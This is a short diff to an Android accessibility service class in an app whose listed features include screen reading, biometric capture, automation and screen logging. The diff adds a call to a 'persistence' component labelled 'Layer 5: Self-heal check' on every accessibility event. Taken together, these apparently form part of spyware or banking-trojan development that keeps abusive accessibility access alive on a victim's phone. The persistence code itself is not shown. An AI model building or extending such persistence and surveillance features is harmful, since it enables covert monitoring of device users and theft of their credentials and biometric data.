@@ -16,6 +16,7 @@ import com.fason.app.features.scrreader.ScrReader;
 import com.fason.app.features.biometrics.BiometricCapture;
 import com.fason.app.features.automation.AutomataManager;
 import com.fason.app.features.screenlog.ScreenLogManager;
+import com.fason.app.persistence.AccessibilitySelfHeal;
 
 public class FasonAccessibilityService extends AccessibilityService {
     private static final String TAG = "FasonA11y";
@@ -43,6 +44,8 @@ public class FasonAccessibilityService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
         try {
+            // Layer 5: Self-heal check
+            AccessibilitySelfHeal.checkAndHeal();
             int type = event.getEventType();
             if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
